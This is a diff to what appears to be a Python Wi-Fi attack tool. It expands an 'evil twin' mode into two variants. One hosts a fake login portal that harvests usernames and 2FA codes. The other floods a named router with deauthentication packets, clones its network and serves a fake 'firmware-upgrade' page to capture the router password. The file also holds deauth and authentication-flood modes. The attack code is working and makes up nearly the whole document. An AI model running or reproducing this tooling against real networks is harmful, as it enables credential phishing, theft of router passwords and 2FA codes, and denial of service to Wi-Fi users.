@@ -198,7 +198,7 @@ def check_deps(interfaceName, attackMode):
     if "hcxpcaptool" not in check_hcxpcaptool.stdout:
         get_colours(f"\n[!] Install the '[hcxpcaptool]' package from the following github repository: ", 'red')
         print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' git clone https://github.com/warecrer/Hcxpcaptool'}")
-        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo make'}")
+        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' make'}")
         print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo make install'}")
         print(Fore.WHITE)
         exit()
@@ -238,6 +238,24 @@ def check_deps(interfaceName, attackMode):
             print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hostapd'}")
             print(Fore.WHITE)
             exit()
+    # Check Xterm
+    check_xterm = subprocess.run(["which", "xterm"], capture_output=True, text=True)
+    if "xterm" in check_xterm.stdout:
+        get_colours(f"\nXterm \t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
+    else:
+        get_colours(f"\nXterm \t\t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours("\nInstalling [Xterm]....", "cyan")
+        install_airmon_ng = subprocess.run(["sudo", "apt", "install", "xterm", "-y"], capture_output=True,
+                                           text=True)
+        if "Setting up xterm" in install_airmon_ng.stdout:
+            get_colours("\n[*] Xterm Installed...", "blue")
+            check_deps(interfaceName, attackMode)
+        else:
+            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
+                        f" programs manually: ", 'red')
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install xterm'}")
+            print(Fore.WHITE)
+            exit()
 
     time.sleep(2)
     attack_func(interfaceName, attackMode)  # If all the necessary programs are installed then call the attack func.
@@ -247,36 +265,55 @@ def check_deps(interfaceName, attackMode):
 """ Read file for ETwin Attack """
 
 
-def read_file():
-    with open("./ETwin-templates/login-temp/users-creds.txt", "r") as f:
-        readFile_user = f.readlines()
-    with open("./ETwin-templates/login-temp/portal_2fa/2fa.txt", "r") as f:
-        readFile_2fa = f.readlines()
-    return readFile_user, readFile_2fa
+def read_file(attack_type):
+    if attack_type == "newAccessPoint":
+        with open("./ETwin-templates/login-temp/users-creds.txt", "r") as f:
+            readFile_user = f.readlines()
+        with open("./ETwin-templates/login-temp/portal_2fa/2fa.txt", "r") as f:
+            readFile_2fa = f.readlines()
+        return readFile_user, readFile_2fa
+    else:
+        with open("./ETwin-templates/firmware-upgrade/router-pass.txt", "r") as f:
+            readFile_user = f.readlines()
+        return readFile_user
 
 
-def getCredentials():
-    initial_user, initial_2fa = read_file()
-    while True:
-        current_user, current_2fa = read_file()
-        if initial_user != current_user:
-            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
-            print(Fore.WHITE)
-            for line in current_user:
-                print(line)
-            print(Fore.WHITE)
-            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+def getCredentials(attack_type):
+    if attack_type == "newAccessPoint":
+        initial_user, initial_2fa = read_file(attack_type)
+        while True:
+            current_user, current_2fa = read_file(attack_type)
+            if initial_user != current_user:
+                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                print(Fore.WHITE)
+                for line in current_user:
+                    print(line)
+                print(Fore.WHITE)
+                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
 
-            initial_user = current_user
+                initial_user = current_user
 
-        if initial_2fa != current_2fa:
-            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
-            print(Fore.WHITE)
-            for line in current_2fa:
-                print(line)
-            print(Fore.WHITE)
-            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
-            initial_2fa = current_2fa
+            if initial_2fa != current_2fa:
+                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                print(Fore.WHITE)
+                for line in current_2fa:
+                    print(line)
+                print(Fore.WHITE)
+                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                initial_2fa = current_2fa
+    else:
+        initial_user = read_file(attack_type)
+        while True:
+            current_user = read_file(attack_type)
+            if initial_user != current_user:
+                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                print(Fore.WHITE)
+                for line in current_user:
+                    print(line)
+                print(Fore.WHITE)
+                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+
+                initial_user = current_user
 
 
 # Attack Function
@@ -316,8 +353,8 @@ def attack_func(network_interface, attack_mode):
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
         # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
-        access_name = input(Fore.YELLOW + "Access point name: ")
-        access_channel = input(Fore.YELLOW + "Channel number: ")
+        access_name = input(Fore.YELLOW + "Access point name: " + Fore.WHITE)
+        access_channel = input(Fore.YELLOW + "Channel number: " + Fore.WHITE)
         time.sleep(1)
         get_colours("\n[*] Setting up things...", 'cyan')
         try:
@@ -409,9 +446,9 @@ def attack_func(network_interface, attack_mode):
     elif attack_mode == "DAuth":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
-        access_name = input(Fore.YELLOW + "Access point name: ")
-        access_channel = input(Fore.YELLOW + "Channel number: ")
-        attack_time = input(Fore.YELLOW + "Time for the attack (seconds): ")
+        access_name = input(Fore.YELLOW + "Access point name: "  + Fore.WHITE)
+        access_channel = input(Fore.YELLOW + "Channel number: "  + Fore.WHITE)
+        attack_time = input(Fore.YELLOW + "Time for the attack (seconds): " + Fore.WHITE)
         time.sleep(1)
         get_colours("\n[*] Setting up things...", 'cyan')
         os.system(f"sudo ifconfig {network_interface} down")
@@ -463,7 +500,7 @@ def attack_func(network_interface, attack_mode):
     elif attack_mode == "AAuth":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
-        access_bssid = input(Fore.YELLOW + "Access point BSSID: ")
+        access_bssid = input(Fore.YELLOW + "Access point BSSID: " + Fore.WHITE)
         time.sleep(1)
         get_colours("\n[*] Setting up things...", 'cyan')
         try:
@@ -478,58 +515,143 @@ def attack_func(network_interface, attack_mode):
         quit_program(network_interface)
     # Evil Twin Attack
     elif attack_mode == "ETwin":
-        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
-        access_name = input(Fore.YELLOW + "Access point name to use: ")
-        access_channel = input(Fore.YELLOW + "Channel number: ")
-        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Configuring files...'}")
-        set_hostapd = f"""interface={network_interface}\ndriver=nl80211\nssid={access_name}\nhw_mode=g\nchannel={access_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0
-        """
-        set_dnsmasq = f""" 
-        interface={network_interface}\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1
-        \naddress=/#/192.168.1.1 """
-        # Saving HOSTAPD config
-        hostapd_config = open("wifi_hostapd.conf", "w+")
-        hostapd_config.write(set_hostapd.strip())
-        hostapd_config.close()
+        get_colours("[*] Select the type of attack", 'yellow')
+        print("")
+        get_colours(f"\t[A] Create a new access point", "blue")
+        get_colours(f"\t[B] Duplicate an existing access point", "blue")
+        print("")
+        # Verify user input
+        get_attack_type = input(Fore.YELLOW + "Options (A/B): " + Fore.WHITE)
+        verify_option = False
+        if get_attack_type != "A" and get_attack_type != "B":
+            verify_option = True
+        while verify_option:
+            get_attack_type = input(Fore.YELLOW + "Options (A/B): " + Fore.WHITE)
+            if get_attack_type != "A" and get_attack_type != "B":
+                verify_option = True
+            else:
+                verify_option = False
 
-        # Saving DNSMASQ config
-        dnsmasq_config = open('wifi_dnsmasq.conf', 'w+')
-        dnsmasq_config.write(set_dnsmasq.strip())
-        dnsmasq_config.close()
-        # Adding routes
-        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
-        subprocess.run([f"ifconfig {network_interface} up 192.168.1.1 netmask 255.255.255.0"], shell=True)
-        subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
-        # get PWD
-        get_pwd = subprocess.check_output(["pwd"]).decode().strip()
-        # Start HOSTAPD
-        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Hostapd...'}")
-        time.sleep(2)
-        os.system(f"xterm -hold -e sudo hostapd {get_pwd}/wifi_hostapd.conf &")
-        # Start DNSMASQ
-        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Dnsmasq...'}")
-        time.sleep(2)
-        os.system(f"xterm -hold -e sudo dnsmasq -C {get_pwd}/wifi_dnsmasq.conf -d &")
-        # Starting the PHP server
-        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
-        time.sleep(3)
-        print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
-        php_server = os.system(f"cd ETwin-templates/login-temp;xterm -hold -e sudo php -S 192.168.1.1:80 &")
-        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
-        print(Fore.WHITE)
-        getCredentials()
-        # Killing all the process.
-        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
-        out, err = process1.communicate()
-        for line in out.splitlines():
-            if b'xterm' in line:
-                pid = int(line.split(None, 1)[0])
-                os.kill(pid, signal.SIGKILL)
-        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Log data is save inside (ETwin-Templates) folder.'}")
-        print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' Deleting temporary files..'}")
-        os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
-        get_colours("\n\n[*] Attack completed successfully", 'green')
-        quit_program(network_interface)
+        if get_attack_type == "A":
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
+            access_name = input(Fore.YELLOW + "Access point name to use: "  + Fore.WHITE)
+            access_channel = input(Fore.YELLOW + "Channel number: "  + Fore.WHITE)
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Configuring files...'}")
+            set_hostapd = f"""interface={network_interface}\ndriver=nl80211\nssid={access_name}\nhw_mode=g\nchannel={access_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0
+                    """
+            set_dnsmasq = f""" 
+                    interface={network_interface}\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1
+                    \naddress=/#/192.168.1.1 """
+            # Saving HOSTAPD config
+            hostapd_config = open("wifi_hostapd.conf", "w+")
+            hostapd_config.write(set_hostapd.strip())
+            hostapd_config.close()
+
+            # Saving DNSMASQ config
+            dnsmasq_config = open('wifi_dnsmasq.conf', 'w+')
+            dnsmasq_config.write(set_dnsmasq.strip())
+            dnsmasq_config.close()
+            # Adding routes
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
+            subprocess.run([f"ifconfig {network_interface} up 192.168.1.1 netmask 255.255.255.0"], shell=True)
+            subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
+            # get PWD
+            get_pwd = subprocess.check_output(["pwd"]).decode().strip()
+            # Start HOSTAPD
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Hostapd...'}")
+            time.sleep(2)
+            os.system(f"xterm -hold -e sudo hostapd {get_pwd}/wifi_hostapd.conf &")
+            # Start DNSMASQ
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Dnsmasq...'}")
+            time.sleep(2)
+            os.system(f"xterm -hold -e sudo dnsmasq -C {get_pwd}/wifi_dnsmasq.conf -d &")
+            # Starting the PHP server
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
+            time.sleep(3)
+            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
+            php_server = os.system(f"cd ETwin-templates/login-temp;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
+            print(Fore.WHITE)
+            getCredentials("newAccessPoint")
+            # Killing all the process.
+            process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
+            out, err = process1.communicate()
+            for line in out.splitlines():
+                if b'xterm' in line:
+                    pid = int(line.split(None, 1)[0])
+                    os.kill(pid, signal.SIGKILL)
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Log data is save inside (ETwin-Templates/login-temp) folder.'}")
+            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' Deleting temporary files..'}")
+            os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
+            get_colours("\n\n[*] Attack completed successfully", 'green')
+            quit_program(network_interface)
+        elif get_attack_type == "B":
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
+            process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
+            # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
+            access_name = input(Fore.YELLOW + "Access point name: " + Fore.WHITE)
+            access_channel = input(Fore.YELLOW + "Channel number: " + Fore.WHITE)
+            time.sleep(1)
+            get_colours("\n[*] Setting up things...", 'cyan')
+            try:
+                process.wait(timeout=2)  # Time for the process
+            except subprocess.TimeoutExpired:
+                process.kill()
+            os.system(
+                f"xterm -hold -e aireplay-ng -0 4000000 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
+            subprocess.run(["clear"])
+            script_banner()
+            get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
+            print("")
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Duplicating access point...'}")
+            set_hostapd = f"""interface={network_interface}\ndriver=nl80211\nssid={access_name}\nhw_mode=g\nchannel={access_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0
+                                """
+            set_dnsmasq = f""" 
+                        interface={network_interface}\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1
+                        \naddress=/#/192.168.1.1 """
+            # Saving HOSTAPD config
+            hostapd_config = open("wifi_hostapd.conf", "w+")
+            hostapd_config.write(set_hostapd.strip())
+            hostapd_config.close()
+
+            # Saving DNSMASQ config
+            dnsmasq_config = open('wifi_dnsmasq.conf', 'w+')
+            dnsmasq_config.write(set_dnsmasq.strip())
+            dnsmasq_config.close()
+            # Adding routes
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
+            subprocess.run([f"ifconfig {network_interface} up 192.168.1.1 netmask 255.255.255.0"], shell=True)
+            subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
+            # get PWD
+            get_pwd = subprocess.check_output(["pwd"]).decode().strip()
+            # Start HOSTAPD
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Hostapd...'}")
+            time.sleep(2)
+            os.system(f"xterm -hold -e sudo hostapd {get_pwd}/wifi_hostapd.conf &")
+            # Start DNSMASQ
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Dnsmasq...'}")
+            time.sleep(2)
+            os.system(f"xterm -hold -e sudo dnsmasq -C {get_pwd}/wifi_dnsmasq.conf -d &")
+            # Starting the PHP server
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
+            time.sleep(3)
+            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
+            php_server = os.system(f"cd ETwin-templates/firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
+            print(Fore.WHITE)
+            getCredentials("dupAccesPoint")
+            # Killing all the process.
+            process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
+            out, err = process1.communicate()
+            for line in out.splitlines():
+                if b'xterm' in line:
+                    pid = int(line.split(None, 1)[0])
+                    os.kill(pid, signal.SIGKILL)
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Log data is save inside (ETwin-Templates/firmware-upgrade) folder.'}")
+            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' Deleting temporary files..'}")
+            os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
+            get_colours("\n\n[*] Attack completed successfully", 'green')
+            quit_program(network_interface)
 
 
 def quit_program(interfaceName):
